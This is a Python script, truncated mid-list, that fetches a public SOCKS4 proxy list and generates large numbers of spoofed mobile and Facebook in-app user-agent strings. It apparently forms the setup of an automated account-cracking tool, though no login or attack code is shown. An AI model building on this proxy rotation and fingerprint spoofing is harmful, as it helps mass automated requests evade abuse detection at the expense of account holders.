#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
redmi=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
   
except Exception as e:
    exit(e)
for xd in range(10000):
	a='Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Firefox/31.0'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5A'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 4.1.2;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Nokia_X Build'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4593.124'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 NokiaBrowser/1.0.1.54'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Nokia_X Build','MHA-L29 Build/','G7-L01 Build/','Nokia_X Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4593.124','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 NokiaBrowser/1.0.1.54','58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]','33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]','27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for meizu in range(10000):
	rr = random.randint; rc = random.choice
	build = ['MRA58K','UCC50Z','QKQ1.200127.002']
	fb=['[FB_IAB/FB4A;FBAV/349.0.0.39.470;]']
	browser = ['HeyTapBrowser','MZBrowser',]
	hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
	v1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,10))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
	v2 = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
	v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
	ngentid = random.choice([hir,v1,v2,v3])
	ugen.append(ngentid)
	
for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	pf = f'{A}{B}{C}{D}'
	if pf in redmi:pass
	else:redmi.append(pf)
	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
	mi = f'{A}{B}{C}'
	if mi in redmi:pass
	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.36'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F) 
	
for meizu in range(1):
	rr = random.randint; rc = random.choice
	build = ['MRA58K','UCC50Z','QKQ1.200127.002']
	fb=['[FB_IAB/FB4A;FBAV/349.0.0.39.470;]']
	browser = ['HeyTapBrowser','MZBrowser',]
	meizu = ["Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.10.110-2018052111 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.122-2018082410 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.6.110-2018121017 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-meizu C9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.99.141-2018092915 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.122-2018082410 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.6.110-2018121017 UWS/2.15.0.2 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018051516 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018082214 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2018092510 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2018102909 UWS/2.15.0.2 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3_s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018031519 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.9.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.4.1 UWS/2.11.0.34 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-15 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.MZ-15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.11.5 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.9.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 